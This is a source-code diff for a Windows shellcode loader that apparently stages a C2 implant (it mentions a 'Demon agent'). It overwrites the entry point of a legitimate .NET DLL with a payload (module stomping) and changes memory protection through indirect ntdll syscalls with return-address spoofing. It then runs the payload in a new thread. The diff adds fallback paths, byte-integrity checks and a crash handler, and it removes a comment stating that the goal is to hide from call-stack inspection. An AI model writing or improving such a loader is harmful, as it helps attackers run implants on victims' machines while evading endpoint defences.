@@ -3,16 +3,12 @@
 #include <stdio.h>
 #include "../common.h"
 
-// Combined technique:
-// 1. Module Stomping - writes payload into legitimate DLL's .text section (MEM_IMAGE)
-// 2. Return Address Spoofing - hides caller address from call stack
-// 3. Indirect Syscalls - bypasses KERNELBASE, uses ntdll syscall instruction directly
-//
-// Result: payload runs from file-backed memory, VirtualProtect call stack shows
-// only ntdll frames, no user code or KERNELBASE visible.
-
 #ifndef STOMP_DLL_PATH
 #define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
+#endif
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
 #endif
 
 struct SpoofContext {
@@ -21,7 +17,7 @@ struct SpoofContext {
     BOOL  Ready;
 };
 
-extern "C" void NtProtectVirtualMemory_Indirect(
+extern "C" NTSTATUS NtProtectVirtualMemory_Indirect(
     HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
     ULONG NewProtect, PULONG OldProtect, PVOID SyscallGadget);
 
@@ -62,25 +58,74 @@ static BOOL InitSpoofContext(SpoofContext* ctx) {
     return ctx->Ready;
 }
 
+static BOOL ChangeProtection(SpoofContext* ctx, PVOID addr, SIZE_T size,
+                              ULONG newProt, PULONG oldProt) {
+    if (ctx->Ready) {
+        PVOID baseAddr = addr;
+        SIZE_T regionSize = size;
+        NTSTATUS status = NtProtectVirtualMemory_Indirect(
+            GetCurrentProcess(), &baseAddr, &regionSize,
+            newProt, oldProt, ctx->SyscallGadget);
+
+        if (status == STATUS_SUCCESS) {
+            printf("[+] Indirect syscall succeeded (status: 0x%lx)\n", (ULONG)status);
+            return TRUE;
+        }
+        printf("[-] Indirect syscall FAILED (status: 0x%lx), falling back to VirtualProtect\n",
+               (ULONG)status);
+    }
+
+    if (!VirtualProtect(addr, size, newProt, (PDWORD)oldProt)) {
+        printf("[-] VirtualProtect also failed (error: %lu)\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] VirtualProtect fallback succeeded\n");
+    return TRUE;
+}
+
+LONG WINAPI CrashHandler(EXCEPTION_POINTERS* ep) {
+    printf("[!!!] EXCEPTION in shellcode!\n");
+    printf("[!!!] Code: 0x%lx at address: %p\n",
+           ep->ExceptionRecord->ExceptionCode,
+           ep->ExceptionRecord->ExceptionAddress);
+    printf("[!!!] RIP: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rip);
+    printf("[!!!] RSP: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rsp);
+    printf("[!!!] RAX: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rax);
+    printf("[!!!] RCX: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rcx);
+    printf("[!!!] RDX: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rdx);
+    fflush(stdout);
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
 int main(int argc, char* argv[]) {
+    AddVectoredExceptionHandler(1, CrashHandler);
+
     SpoofContext ctx = {0};
-    PrintSuccess("Stack Spoofing Context Initialized");
 
     if (!InitSpoofContext(&ctx)) {
-        PrintError("Failed to initialize spoof context");
+        PrintError("Failed to find gadgets in ntdll");
         return 1;
     }
-    printf("[+] Gadget : %p\n", ctx.Gadget);
-    printf("[+] SyscallGadget : %p\n", ctx.SyscallGadget);
+    printf("[+] Gadget (call r12) : %p\n", ctx.Gadget);
+    printf("[+] SyscallGadget     : %p\n", ctx.SyscallGadget);
 
     BYTE* payload = NULL;
     DWORD payloadSize = 0;
     if (!LoadPayload(&payload, &payloadSize)) return 1;
 
-    PrintStep(2, "Loading sacrificial DLL and resolving Entry Point");
+    // Save first 16 bytes for verification later
+    BYTE savedHeader[16];
+    memcpy(savedHeader, payload, 16);
+
+    PrintStep(2, "Loading sacrificial DLL");
     HMODULE hModule = LoadLibraryW(STOMP_DLL_PATH);
-    if (!hModule) { PrintError("LoadLibrary failed"); free(payload); return 1; }
-    wprintf(L"[+] %s loaded at: 0x%p\n", STOMP_DLL_PATH, hModule);
+    if (!hModule) {
+        PrintError("LoadLibrary failed");
+        free(payload);
+        return 1;
+    }
+    DisableThreadLibraryCalls(hModule);
+    printf("[+] Loaded DLL at: 0x%p\n", hModule);
 
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
@@ -88,62 +133,107 @@ int main(int argc, char* argv[]) {
 
     DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
     LPVOID entryPoint = (LPVOID)((BYTE*)hModule + entryPointRVA);
-    printf("[+] Entry Point address: 0x%p\n", entryPoint);
+    printf("[+] Entry Point: 0x%p (RVA: 0x%lx)\n", entryPoint, entryPointRVA);
 
+    LPVOID textBase = NULL;
     DWORD textSize = 0;
-    printf("[+] Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
+    DWORD textVA = 0;
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        printf("[DEBUG] Section %d: '%.8s' (Raw: 0x%lx)\n", i,
-               sectionHeader[i].Name, sectionHeader[i].SizeOfRawData);
         if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
+            textVA = sectionHeader[i].VirtualAddress;
+            textBase = (LPVOID)((BYTE*)hModule + textVA);
             textSize = sectionHeader[i].Misc.VirtualSize;
         }
     }
 
-    if (payloadSize > textSize) {
-        printf("[-] Payload (%lu) exceeds .text section (%lu)\n", payloadSize, textSize);
+    if (!textBase) {
+        PrintError("No .text section found");
         free(payload);
         return 1;
     }
-    printf("[+] Available memory (from EP): %lu bytes\n", textSize);
-    printf("[+] Payload size: %lu bytes\n", payloadSize);
+
+    DWORD availableFromEP = textSize;
+    if (entryPointRVA >= textVA && entryPointRVA < textVA + textSize) {
+        availableFromEP = textSize - (entryPointRVA - textVA);
+        printf("[+] EP inside .text — available: %lu bytes\n", availableFromEP);
+    } else {
+        printf("[!] EP outside .text, using .text base\n");
+        entryPoint = textBase;
+        availableFromEP = textSize;
+    }
+
+    if (payloadSize > availableFromEP) {
+        printf("[-] Payload too large\n");
+        free(payload);
+        return 1;
+    }
+    printf("[+] Payload: %lu bytes (fits in %lu)\n", payloadSize, availableFromEP);
+
+    MEMORY_BASIC_INFORMATION mbi;
+    VirtualQuery(entryPoint, &mbi, sizeof(mbi));
+    printf("[i] Protection before: 0x%lx  Type: 0x%lx  State: 0x%lx\n",
+           mbi.Protect, mbi.Type, mbi.State);
 
     PrintStep(3, "Stomping module memory");
-    printf("[*] Changing protection to RW using Stack Spoofing & Indirect Syscall\n");
-
-    PVOID baseAddr = entryPoint;
-    SIZE_T regionSize = payloadSize;
     ULONG oldProtect = 0;
-
-    if (ctx.Ready) {
-        NtProtectVirtualMemory_Indirect(GetCurrentProcess(), &baseAddr, &regionSize,
-                                         PAGE_READWRITE, &oldProtect, ctx.SyscallGadget);
-    } else {
-        VirtualProtect(entryPoint, payloadSize, PAGE_READWRITE, (PDWORD)&oldProtect);
+    if (!ChangeProtection(&ctx, entryPoint, payloadSize, PAGE_READWRITE, &oldProtect)) {
+        PrintError("Cannot change to RW");
+        free(payload);
+        return 1;
     }
-    PrintSuccess("Memory protection changed to RW");
 
     memcpy(entryPoint, payload, payloadSize);
-    PrintSuccess("Payload written to entry point");
     free(payload);
 
-    printf("[*] Restoring protection to RX using Stack Spoofing & Indirect Syscall\n");
-    baseAddr = entryPoint;
-    regionSize = payloadSize;
+    // Verify ALL bytes match, not just first 4
+    BOOL integrity = (memcmp(entryPoint, savedHeader, 16) == 0);
+    printf("[+] Payload written. First 16: ");
+    for (int i = 0; i < 16; i++) printf("%02X ", ((BYTE*)entryPoint)[i]);
+    printf("\n[+] Integrity check: %s\n", integrity ? "PASS" : "FAIL");
+
     ULONG tmpProtect = 0;
+    ChangeProtection(&ctx, entryPoint, payloadSize,
+                     oldProtect ? oldProtect : PAGE_EXECUTE_READ, &tmpProtect);
 
-    if (ctx.Ready) {
-        NtProtectVirtualMemory_Indirect(GetCurrentProcess(), &baseAddr, &regionSize,
-                                         oldProtect, &tmpProtect, ctx.SyscallGadget);
-    } else {
-        VirtualProtect(entryPoint, payloadSize, oldProtect, (PDWORD)&tmpProtect);
+    VirtualQuery(entryPoint, &mbi, sizeof(mbi));
+    printf("[i] Protection after: 0x%lx  Type: 0x%lx  State: 0x%lx\n",
+           mbi.Protect, mbi.Type, mbi.State);
+
+    // Re-verify bytes after protection change (check COW didn't revert)
+    BOOL postIntegrity = (memcmp(entryPoint, savedHeader, 16) == 0);
+    printf("[+] Post-restore integrity: %s\n", postIntegrity ? "PASS" : "FAIL");
+    if (!postIntegrity) {
+        printf("[!!!] BYTES CHANGED after VirtualProtect! COW reverted?\n");
+        printf("[!!!] Got: ");
+        for (int i = 0; i < 16; i++) printf("%02X ", ((BYTE*)entryPoint)[i]);
+        printf("\n");
     }
-    PrintSuccess("Memory protection restored to RX");
-    PrintSuccess("Stomping completed successfully");
 
-    PrintStep(4, "Executing payload in main thread");
-    printf("[+] Executing payload in main thread at: %p\n", entryPoint);
-    ((void(*)())entryPoint)();
+    PrintStep(4, "Executing payload");
+    printf("[+] Start address: %p\n", entryPoint);
+    fflush(stdout);
 
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+    if (!hThread) {
+        PrintError("CreateThread failed");
+        return 1;
+    }
+    printf("[+] Thread created (ID: %lu)\n", GetThreadId(hThread));
+    printf("[+] Waiting for thread...\n");
+    fflush(stdout);
+
+    DWORD waitResult = WaitForSingleObject(hThread, 10000);
+    if (waitResult == WAIT_TIMEOUT) {
+        printf("[+] Thread still running after 10s (expected for Demon agent)\n");
+        WaitForSingleObject(hThread, INFINITE);
+    } else {
+        DWORD exitCode = 0;
+        GetExitCodeThread(hThread, &exitCode);
+        printf("[!] Thread EXITED after %lu ms (exit code: 0x%lx)\n",
+               waitResult, exitCode);
+        printf("[!] This means shellcode returned or crashed\n");
+    }
+
+    CloseHandle(hThread);
     return 0;
 }
